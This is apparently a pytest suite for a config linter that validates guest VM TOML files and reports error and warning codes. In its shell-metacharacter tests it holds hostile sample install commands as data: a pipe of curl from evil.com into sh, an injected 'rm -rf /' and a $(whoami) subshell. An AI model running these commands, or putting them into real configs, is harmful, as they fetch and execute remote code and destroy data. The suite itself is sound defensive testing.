"""Tests for capsem.builder.validate -- compiler-style config linter.

TDD: tests written first (RED), then validate.py makes them pass (GREEN).
Each error/warning code has at least one test with a crafted invalid input.
Adversarial/complex tests verify the linter catches subtle misconfigurations.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path

import pytest

from capsem.builder.validate import (
    Diagnostic,
    Severity,
    validate_guest,
    find_toml_line,
)

PROJECT_ROOT = Path(__file__).parent.parent

# ---------------------------------------------------------------------------
# Inline TOML fixtures (valid)
# ---------------------------------------------------------------------------

MINIMAL_BUILD_TOML = """\
[build]
compression = "zstd"
compression_level = 15

[build.architectures.arm64]
base_image = "debian:bookworm-slim"
docker_platform = "linux/arm64"
rust_target = "aarch64-unknown-linux-musl"
kernel_branch = "6.6"
kernel_image = "arch/arm64/boot/Image"
defconfig = "kernel/defconfig.arm64"
node_major = 24
"""

GOOGLE_AI_TOML = """\
[google]
name = "Google AI"
description = "Google Gemini AI provider"
enabled = true

[google.api_key]
name = "Google AI API Key"
env_vars = ["GEMINI_API_KEY"]
prefix = "AIza"
docs_url = "https://aistudio.google.com/apikey"

[google.network]
domains = ["*.googleapis.com"]
allow_get = true
allow_post = true
"""

CAPSEM_MCP_TOML = """\
[capsem]
name = "Capsem"
description = "Built-in Capsem MCP server"
transport = "stdio"
command = "/run/capsem-mcp-server"
builtin = true
enabled = true
"""

WEB_SECURITY_TOML = """\
[web]
allow_read = false
allow_write = false
custom_allow = []
custom_block = []

[web.search.google]
name = "Google"
enabled = true
domains = ["www.google.com"]
allow_get = true

[web.registry.pypi]
name = "PyPI"
enabled = true
domains = ["pypi.org"]
allow_get = true

[web.repository.github]
name = "GitHub"
enabled = true
domains = ["github.com"]
allow_get = true
allow_post = true
"""

VM_RESOURCES_TOML = """\
[resources]
cpu_count = 4
ram_gb = 4
scratch_disk_size_gb = 16
"""

VM_ENVIRONMENT_TOML = """\
[environment.shell]
term = "xterm-256color"
home = "/root"
path = "/usr/bin:/bin"
lang = "C"

[environment.tls]
ca_bundle = "/etc/ssl/certs/ca-certificates.crt"
"""

PYTHON_PACKAGES_TOML = """\
[python]
name = "Python Packages"
manager = "uv"
install_cmd = "uv pip install --system"
packages = ["pytest", "requests"]

[python.network]
name = "PyPI"
domains = ["pypi.org"]
allow_get = true
"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_ai_toml(key, *, domains=None, env_vars=None, files=None, cli=None):
    """Build an AI provider TOML string programmatically."""
    domains = domains or [f"*.{key}.com"]
    env_vars = env_vars or [f"{key.upper()}_API_KEY"]
    lines = [
        f"[{key}]",
        f'name = "{key.title()}"',
        "enabled = true",
        "",
        f"[{key}.api_key]",
        f'name = "{key.title()} Key"',
        f'env_vars = {json.dumps(env_vars)}',
        "",
        f"[{key}.network]",
        f'domains = {json.dumps(domains)}',
        "allow_get = true",
    ]
    if cli:
        lines += ["", f"[{key}.cli]", f'key = "{cli}"', f'name = "{cli.title()}"']
    if files:
        for fk, fv in files.items():
            lines += [
                "", f"[{key}.files.{fk}]",
                f'path = "{fv["path"]}"',
                f"content = {json.dumps(fv['content'])}",
            ]
    return "\n".join(lines) + "\n"


@pytest.fixture
def guest_valid(tmp_path):
    """Create a fully valid guest directory."""
    config = tmp_path / "guest" / "config"
    config.mkdir(parents=True)
    (config / "build.toml").write_text(MINIMAL_BUILD_TOML)
    ai = config / "ai"
    ai.mkdir()
    (ai / "google.toml").write_text(GOOGLE_AI_TOML)
    mcp = config / "mcp"
    mcp.mkdir()
    (mcp / "capsem.toml").write_text(CAPSEM_MCP_TOML)
    sec = config / "security"
    sec.mkdir()
    (sec / "web.toml").write_text(WEB_SECURITY_TOML)
    vm = config / "vm"
    vm.mkdir()
    (vm / "resources.toml").write_text(VM_RESOURCES_TOML)
    (vm / "environment.toml").write_text(VM_ENVIRONMENT_TOML)
    pkg = config / "packages"
    pkg.mkdir()
    (pkg / "python.toml").write_text(PYTHON_PACKAGES_TOML)
    kernel = config / "kernel"
    kernel.mkdir()
    (kernel / "defconfig.arm64").write_text("# kernel config\n")
    return tmp_path / "guest"


def _codes(diags: list[Diagnostic]) -> list[str]:
    return [d.code for d in diags]


def _errors(diags: list[Diagnostic]) -> list[Diagnostic]:
    return [d for d in diags if d.severity == Severity.ERROR]


def _warnings(diags: list[Diagnostic]) -> list[Diagnostic]:
    return [d for d in diags if d.severity == Severity.WARNING]


def _has_code(diags: list[Diagnostic], code: str) -> bool:
    return any(d.code == code for d in diags)


def _diag_for(diags: list[Diagnostic], code: str) -> Diagnostic | None:
    return next((d for d in diags if d.code == code), None)


# ---------------------------------------------------------------------------
# Diagnostic model
# ---------------------------------------------------------------------------


class TestDiagnostic:
    def test_construction(self):
        d = Diagnostic(
            code="E001", severity=Severity.ERROR,
            message="Missing build.toml", file="guest/config/build.toml", line=None,
        )
        assert d.code == "E001"
        assert d.severity == Severity.ERROR
        assert d.file == "guest/config/build.toml"
        assert d.line is None

    def test_with_line(self):
        d = Diagnostic(code="E003", severity=Severity.ERROR, message="Invalid value", file="build.toml", line=5)
        assert d.line == 5

    def test_str_format(self):
        d = Diagnostic(code="E001", severity=Severity.ERROR, message="Missing build.toml", file="build.toml")
        s = str(d)
        assert "E001" in s
        assert "error" in s.lower()
        assert "Missing build.toml" in s

    def test_str_with_line(self):
        d = Diagnostic(code="E003", severity=Severity.ERROR, message="Bad field", file="build.toml", line=10)
        assert "build.toml:10" in str(d)

    def test_severity_enum(self):
        assert Severity.ERROR.value == "error"
        assert Severity.WARNING.value == "warning"


# ---------------------------------------------------------------------------
# find_toml_line
# ---------------------------------------------------------------------------


class TestFindTomlLine:
    def test_finds_key(self):
        text = "[build]\ncompression = 'zstd'\ncompression_level = 15\n"
        assert find_toml_line(text, "compression_level") == 3

    def test_finds_section(self):
        text = "[build]\nfoo = 1\n\n[build.architectures.arm64]\nbar = 2\n"
        assert find_toml_line(text, "build.architectures.arm64") == 4

    def test_not_found(self):
        text = "[build]\nfoo = 1\n"
        assert find_toml_line(text, "nonexistent") is None

    def test_finds_table_key(self):
        text = "[web]\nallow_read = true\n\n[web.search.google]\nname = 'Google'\n"
        assert find_toml_line(text, "web.search.google") == 4

    def test_finds_first_occurrence(self):
        text = "[a]\nkey = 1\n\n[b]\nkey = 2\n"
        assert find_toml_line(text, "key") == 2

    def test_ignores_comments(self):
        text = "# compression_level = 99\n[build]\ncompression_level = 15\n"
        # Should find the actual key, not the comment (line 3 not line 1)
        # Since we use ^key\s*= which doesn't match comments with leading #
        assert find_toml_line(text, "compression_level") == 3


# ---------------------------------------------------------------------------
# Valid config produces no errors
# ---------------------------------------------------------------------------


class TestValidClean:
    def test_valid_config_no_errors(self, guest_valid):
        diags = validate_guest(guest_valid)
        errors = _errors(diags)
        assert errors == [], f"Unexpected errors: {errors}"

    def test_valid_config_returns_list(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert isinstance(diags, list)

    def test_valid_config_sorted_by_severity_then_code(self, guest_valid):
        diags = validate_guest(guest_valid)
        for i in range(1, len(diags)):
            prev = (diags[i - 1].severity.value, diags[i - 1].code)
            curr = (diags[i].severity.value, diags[i].code)
            assert prev <= curr, f"Diagnostics not sorted: {diags[i-1]} before {diags[i]}"


# ---------------------------------------------------------------------------
# E001: Missing required file (build.toml)
# ---------------------------------------------------------------------------


class TestE001:
    def test_missing_build_toml(self, tmp_path):
        config = tmp_path / "guest" / "config"
        config.mkdir(parents=True)
        diags = validate_guest(tmp_path / "guest")
        assert _has_code(diags, "E001")

    def test_missing_config_dir(self, tmp_path):
        guest = tmp_path / "guest"
        guest.mkdir()
        diags = validate_guest(guest)
        assert _has_code(diags, "E001")

    def test_e001_stops_further_validation(self, tmp_path):
        """When build.toml is missing, deeper checks are skipped."""
        config = tmp_path / "guest" / "config"
        config.mkdir(parents=True)
        diags = validate_guest(tmp_path / "guest")
        # Should only have E001, nothing else
        assert all(d.code == "E001" for d in diags)


# ---------------------------------------------------------------------------
# E002: Invalid TOML syntax
# ---------------------------------------------------------------------------


class TestE002:
    def test_broken_toml(self, guest_valid):
        (guest_valid / "config" / "build.toml").write_text("[broken\nno bracket")
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E002")

    def test_broken_ai_toml(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text("{{invalid}}")
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E002")

    def test_broken_toml_in_subdir(self, guest_valid):
        (guest_valid / "config" / "vm" / "resources.toml").write_text("broken = [")
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E002")

    def test_multiple_broken_files(self, guest_valid):
        """Multiple TOML errors produce multiple E002 diagnostics."""
        (guest_valid / "config" / "ai" / "google.toml").write_text("{{bad}}")
        (guest_valid / "config" / "mcp" / "capsem.toml").write_text("[broken")
        diags = validate_guest(guest_valid)
        e002s = [d for d in diags if d.code == "E002"]
        assert len(e002s) >= 2


# ---------------------------------------------------------------------------
# E003: Pydantic validation failure
# ---------------------------------------------------------------------------


class TestE003:
    def test_invalid_compression_level(self, guest_valid):
        (guest_valid / "config" / "build.toml").write_text(textwrap.dedent("""\
            [build]
            compression_level = 99

            [build.architectures.arm64]
            docker_platform = "linux/arm64"
            rust_target = "aarch64-unknown-linux-musl"
            kernel_image = "arch/arm64/boot/Image"
            defconfig = "kernel/defconfig.arm64"
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E003")

    def test_missing_required_field(self, guest_valid):
        (guest_valid / "config" / "build.toml").write_text("[build]\ncompression = 'zstd'\n")
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E003")

    def test_invalid_compression_enum(self, guest_valid):
        (guest_valid / "config" / "build.toml").write_text(textwrap.dedent("""\
            [build]
            compression = "brotli"

            [build.architectures.arm64]
            docker_platform = "linux/arm64"
            rust_target = "aarch64-unknown-linux-musl"
            kernel_image = "arch/arm64/boot/Image"
            defconfig = "kernel/defconfig.arm64"
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E003")


# ---------------------------------------------------------------------------
# E004: Empty package list
# ---------------------------------------------------------------------------


class TestE004:
    def test_empty_packages(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install"
            packages = []
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E004")


# ---------------------------------------------------------------------------
# E005: Invalid package manager
# ---------------------------------------------------------------------------


class TestE005:
    def test_invalid_manager(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "conda"
            install_cmd = "conda install"
            packages = ["numpy"]
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E005")


# ---------------------------------------------------------------------------
# E006: Invalid domain pattern
# ---------------------------------------------------------------------------


class TestE006:
    def test_domain_with_scheme(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["https://googleapis.com"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")

    def test_domain_with_path(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["example.com/path"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")

    def test_empty_domain(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=[""]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")

    def test_domain_with_port(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = false
            allow_write = false

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com:8080"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")

    def test_whitespace_only_domain(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["   "]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")

    def test_valid_wildcard_domain_ok(self, guest_valid):
        """*.example.com is a valid pattern."""
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E006")


# ---------------------------------------------------------------------------
# E007: MCP transport/command mismatch
# ---------------------------------------------------------------------------


class TestE007:
    def test_stdio_without_command(self, guest_valid):
        (guest_valid / "config" / "mcp" / "capsem.toml").write_text(textwrap.dedent("""\
            [capsem]
            name = "Capsem"
            transport = "stdio"
            enabled = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E003") or _has_code(diags, "E007")

    def test_sse_without_url(self, guest_valid):
        (guest_valid / "config" / "mcp" / "bad.toml").write_text(textwrap.dedent("""\
            [bad]
            name = "Bad"
            transport = "sse"
            enabled = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E003") or _has_code(diags, "E007")


# ---------------------------------------------------------------------------
# E008: Duplicate key across files
# ---------------------------------------------------------------------------


class TestE008:
    def test_duplicate_provider_key(self, guest_valid):
        (guest_valid / "config" / "ai" / "google2.toml").write_text(GOOGLE_AI_TOML)
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E008")

    def test_duplicate_mcp_key(self, guest_valid):
        (guest_valid / "config" / "mcp" / "capsem2.toml").write_text(CAPSEM_MCP_TOML)
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E008")

    def test_duplicate_package_set_key(self, guest_valid):
        (guest_valid / "config" / "packages" / "python2.toml").write_text(PYTHON_PACKAGES_TOML)
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E008")

    def test_different_keys_across_files_ok(self, guest_valid):
        """Different keys in different files is fine."""
        (guest_valid / "config" / "ai" / "openai.toml").write_text(
            _make_ai_toml("openai"))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E008")


# ---------------------------------------------------------------------------
# E009: File path not absolute
# ---------------------------------------------------------------------------


class TestE009:
    def test_relative_file_path(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "relative/path.json", "content": "{}"}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E009")

    def test_tilde_file_path(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "~/.config/test.json", "content": "{}"}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E009")

    def test_absolute_path_ok(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/.config/test.json", "content": "{}"}}))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E009")


# ---------------------------------------------------------------------------
# E010: Invalid JSON in file content for .json files
# ---------------------------------------------------------------------------


class TestE010:
    def test_broken_json_content(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/.config/test.json", "content": '{"broken": true,'}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E010")

    def test_valid_json_content_ok(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/.config/test.json", "content": '{"valid": true}'}}))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E010")

    def test_non_json_file_not_checked(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/.bashrc", "content": "not json {{"}}))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E010")

    def test_empty_json_content_ok(self, guest_valid):
        """Empty content for .json file is ok (the file is optional/injected at runtime)."""
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/.config/test.json", "content": ""}}))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E010")


# ---------------------------------------------------------------------------
# E100: Generated JSON fails schema validation (negative test)
# ---------------------------------------------------------------------------


class TestE100:
    def test_valid_config_no_e100(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E100")


# ---------------------------------------------------------------------------
# E101: Setting ID collision (negative test)
# ---------------------------------------------------------------------------


class TestE101:
    def test_no_collision_in_valid(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E101")


# ---------------------------------------------------------------------------
# E300: Missing defconfig for configured architecture
# ---------------------------------------------------------------------------


class TestE300:
    def test_missing_defconfig(self, guest_valid):
        (guest_valid / "config" / "kernel" / "defconfig.arm64").unlink()
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E300")

    def test_missing_kernel_dir(self, guest_valid):
        import shutil
        shutil.rmtree(guest_valid / "config" / "kernel")
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E300")

    def test_multi_arch_missing_one(self, guest_valid):
        """Two architectures configured, one defconfig missing."""
        (guest_valid / "config" / "build.toml").write_text(textwrap.dedent("""\
            [build]
            compression = "zstd"

            [build.architectures.arm64]
            docker_platform = "linux/arm64"
            rust_target = "aarch64-unknown-linux-musl"
            kernel_image = "arch/arm64/boot/Image"
            defconfig = "kernel/defconfig.arm64"

            [build.architectures.x86_64]
            docker_platform = "linux/amd64"
            rust_target = "x86_64-unknown-linux-musl"
            kernel_image = "arch/x86_64/boot/bzImage"
            defconfig = "kernel/defconfig.x86_64"
        """))
        # arm64 exists, x86_64 does not
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E300")
        e300 = _diag_for(diags, "E300")
        assert "x86_64" in e300.message


# ---------------------------------------------------------------------------
# E301: Missing CA certificate
# ---------------------------------------------------------------------------


class TestE301:
    def test_ca_cert_not_checked_by_default(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E301")

    def test_missing_ca_cert(self, guest_valid):
        artifacts = guest_valid / "artifacts"
        artifacts.mkdir()
        diags = validate_guest(guest_valid, artifacts_dir=artifacts)
        assert _has_code(diags, "E301")

    def test_present_ca_cert(self, guest_valid):
        artifacts = guest_valid / "artifacts"
        artifacts.mkdir()
        (artifacts / "capsem-ca.crt").write_text("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----\n")
        diags = validate_guest(guest_valid, artifacts_dir=artifacts)
        assert not _has_code(diags, "E301")


# ---------------------------------------------------------------------------
# E302: Missing required artifact
# ---------------------------------------------------------------------------


def _create_all_artifacts(artifacts_dir, *, skip=None):
    """Create all required artifacts, optionally skipping one by name."""
    from capsem.builder.docker import (
        ROOTFS_SCRIPTS,
        ROOTFS_SCRIPT_DIRS,
        ROOTFS_SUPPORT_FILES,
    )
    (artifacts_dir / "capsem-ca.crt").write_text("cert")
    all_files = ["capsem-init"] + list(ROOTFS_SUPPORT_FILES) + list(ROOTFS_SCRIPTS)
    for name in all_files:
        if name != skip:
            (artifacts_dir / name).write_text("stub")
    for name in ROOTFS_SCRIPT_DIRS:
        if name != skip:
            (artifacts_dir / name).mkdir(exist_ok=True)


class TestE302:
    def test_missing_capsem_init(self, guest_valid):
        artifacts = guest_valid / "artifacts"
        artifacts.mkdir()
        _create_all_artifacts(artifacts, skip="capsem-init")
        diags = validate_guest(guest_valid, artifacts_dir=artifacts)
        assert _has_code(diags, "E302")

    def test_missing_snapshots(self, guest_valid):
        artifacts = guest_valid / "artifacts"
        artifacts.mkdir()
        _create_all_artifacts(artifacts, skip="snapshots")
        diags = validate_guest(guest_valid, artifacts_dir=artifacts)
        e302_diags = [d for d in diags if d.code == "E302"]
        assert any("snapshots" in d.message for d in e302_diags)

    def test_all_artifacts_present(self, guest_valid):
        artifacts = guest_valid / "artifacts"
        artifacts.mkdir()
        _create_all_artifacts(artifacts)
        diags = validate_guest(guest_valid, artifacts_dir=artifacts)
        assert not _has_code(diags, "E302")


# ---------------------------------------------------------------------------
# W001: Package sets but no registry
# ---------------------------------------------------------------------------


class TestW001:
    def test_provider_no_registry(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = false
            allow_write = false

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W001")


# ---------------------------------------------------------------------------
# W002: -dev packages
# ---------------------------------------------------------------------------


class TestW002:
    def test_dev_packages(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install"
            packages = ["numpy", "libssl-dev"]
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W002")

    def test_devel_suffix(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install"
            packages = ["openssl-devel"]
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W002")

    def test_normal_packages_ok(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W002")


# ---------------------------------------------------------------------------
# W003: Potential secrets
# ---------------------------------------------------------------------------


class TestW003:
    def test_api_key_in_content(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/cfg.json", "content": '{"key": "sk-ant-api03-realkey1234567890"}'}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W003")

    def test_bearer_token_in_mcp_header(self, guest_valid):
        (guest_valid / "config" / "mcp" / "capsem.toml").write_text(textwrap.dedent("""\
            [capsem]
            name = "Capsem"
            transport = "stdio"
            command = "/run/capsem-mcp-server"
            headers = { Authorization = "Bearer ghp_realtoken12345678901234567890" }
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W003")

    def test_secret_in_bashrc(self, guest_valid):
        (guest_valid / "config" / "vm" / "environment.toml").write_text(textwrap.dedent("""\
            [environment.shell]
            term = "xterm-256color"
            home = "/root"
            path = "/usr/bin:/bin"
            lang = "C"

            [environment.shell.bashrc]
            path = "/root/.bashrc"
            content = "export ANTHROPIC_API_KEY=sk-ant-api03-realkey1234567890"

            [environment.tls]
            ca_bundle = "/etc/ssl/certs/ca-certificates.crt"
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W003")

    def test_secret_in_mcp_env(self, guest_valid):
        (guest_valid / "config" / "mcp" / "capsem.toml").write_text(textwrap.dedent("""\
            [capsem]
            name = "Capsem"
            transport = "stdio"
            command = "/run/capsem-mcp-server"
            env = { SECRET = "sk-ant-api03-realkey1234567890" }
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W003")

    def test_no_false_positive_on_prefix(self, guest_valid):
        """The api_key.prefix field like 'sk-ant-' is not a real key."""
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W003")


# ---------------------------------------------------------------------------
# W004: Package set with no network config
# ---------------------------------------------------------------------------


class TestW004:
    def test_package_set_no_network(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install"
            packages = ["pytest"]
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W004")


# ---------------------------------------------------------------------------
# W005: Allow/block overlap
# ---------------------------------------------------------------------------


class TestW005:
    def test_overlapping_allow_block(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = false
            allow_write = false
            custom_allow = ["example.com", "evil.com"]
            custom_block = ["evil.com"]

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W005")
        d = _diag_for(diags, "W005")
        assert "evil.com" in d.message

    def test_multiple_overlaps(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = false
            allow_write = false
            custom_allow = ["a.com", "b.com", "c.com"]
            custom_block = ["a.com", "c.com"]

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W005")
        d = _diag_for(diags, "W005")
        assert "a.com" in d.message
        assert "c.com" in d.message


# ---------------------------------------------------------------------------
# W006: Placeholder content
# ---------------------------------------------------------------------------


class TestW006:
    def test_placeholder_content(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/cfg.json", "content": "TODO"}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W006")

    def test_fixme(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/cfg", "content": "FIXME"}}))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W006")

    def test_empty_content_not_placeholder(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", files={"cfg": {"path": "/root/cfg.json", "content": ""}}))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W006")


# ---------------------------------------------------------------------------
# W007: Overly broad wildcard domain
# ---------------------------------------------------------------------------


class TestW007:
    def test_bare_star(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["*"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W007")

    def test_star_dot_com(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["*.com"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W007")

    def test_star_dot_net(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["*.net"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W007")

    def test_normal_wildcard_ok(self, guest_valid):
        """*.googleapis.com is fine."""
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W007")

    def test_broad_domain_in_web_security(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = false
            allow_write = false
            custom_allow = ["*.com"]

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W007")


# ---------------------------------------------------------------------------
# W008: Duplicate env_var across AI providers
# ---------------------------------------------------------------------------


class TestW008:
    def test_duplicate_env_var(self, guest_valid):
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", env_vars=["SHARED_KEY", "GEMINI_KEY"]))
        (guest_valid / "config" / "ai" / "openai.toml").write_text(
            _make_ai_toml("openai", env_vars=["SHARED_KEY", "OPENAI_KEY"]))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W008")
        d = _diag_for(diags, "W008")
        assert "SHARED_KEY" in d.message

    def test_unique_env_vars_ok(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W008")


# ---------------------------------------------------------------------------
# W009: Shell metacharacters in install_cmd
# ---------------------------------------------------------------------------


class TestW009:
    def test_pipe_in_install_cmd(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "curl http://evil.com | sh"
            packages = ["pytest"]

            [python.network]
            name = "PyPI"
            domains = ["pypi.org"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W009")

    def test_semicolon_in_install_cmd(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "apt install -y; rm -rf /"
            packages = ["pytest"]

            [python.network]
            name = "PyPI"
            domains = ["pypi.org"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W009")

    def test_subshell_in_install_cmd(self, guest_valid):
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install $(whoami)"
            packages = ["pytest"]

            [python.network]
            name = "PyPI"
            domains = ["pypi.org"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W009")

    def test_normal_install_cmd_ok(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W009")


# ---------------------------------------------------------------------------
# W010: PATH missing essential directories
# ---------------------------------------------------------------------------


class TestW010:
    def test_path_missing_usr_bin(self, guest_valid):
        (guest_valid / "config" / "vm" / "environment.toml").write_text(textwrap.dedent("""\
            [environment.shell]
            term = "xterm-256color"
            home = "/root"
            path = "/opt/custom/bin"
            lang = "C"

            [environment.tls]
            ca_bundle = "/etc/ssl/certs/ca-certificates.crt"
        """))
        diags = validate_guest(guest_valid)
